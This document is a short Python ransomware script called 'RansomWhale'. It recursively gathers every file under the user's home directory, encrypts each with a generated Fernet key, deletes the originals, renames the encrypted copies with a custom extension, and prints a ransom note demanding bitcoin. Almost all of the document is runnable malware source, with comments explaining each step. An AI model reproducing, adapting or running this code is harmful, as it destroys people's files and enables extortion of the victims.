
#############[Packages]#############
###### cryptography package has our Fernet Symetric Encryption
######  ↳ AES in CBC mode with a 128-bit key for encryption; using PKCS7 padding.
######    HMAC using SHA256 for authentication.
from cryptography.fernet import Fernet
import os
import glob #finds all the pathnames matching a specified pattern
####################################



############[Directory Setup]############
homeDir = os.path.expanduser('~') #grabs user home directory
files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs files we want to encrypt   
                                                       #we can switch / for linux to \\ for windows
#########################################



############[Keygen]############
fern_key = Fernet.generate_key()
key = open("secret.key", "wb")
key.write(fern_key)
key.close()
################################



############[Targeting Files]############
file_list=[]
for filename in files:
    if ".key" not in filename and ".py" not in filename:    #This makes sure we do not accidentally Encrypt our Key and Ransomware
        file_list.append(filename)
#########################################



############[Encrypting Files]############
fernet = Fernet(fern_key) #Supply Fernet with our Key
for file in file_list:
    fileName = str(file)
    extension = os.path.splitext(file)[1]  #gets extension
    
    with open(file, 'rb') as f:
        f_bytes=f.read()
    
    f_bytes_encrypted = fernet.encrypt(f_bytes)
    print(f'RansomWhale was hungry and ate your file {file}')
    os.remove(file) #Removes our old unencrypted file
    
    fileExtension = '.RansomWhale.mp4'    #This is just for fun, adds a Custom Extension
    encFile = fileName + fileExtension  #Builds our Encrytped file with it's name + our Custom Extension
    
    with open(encFile, 'wb') as f:      
        f.write(f_bytes_encrypted)      #Writes the Encrypted bytes to our Encrypted file.
                                        # ↳ Even though we removed the file itself earlier, we kept the bytes (f_bytes_encrypted), which we write to our encFile
##########################################



ransomNote="""
Attention, your Personal Files have been Encrypted with a Government Grade Encryption System.
Please upload a Maximum of 5 files per 1btc along with the [/app/secret.key] file 
to our website www.uploaderwebsite.com along with your recepit.
Thank you for your understanding.
"""
print(ransomNote)
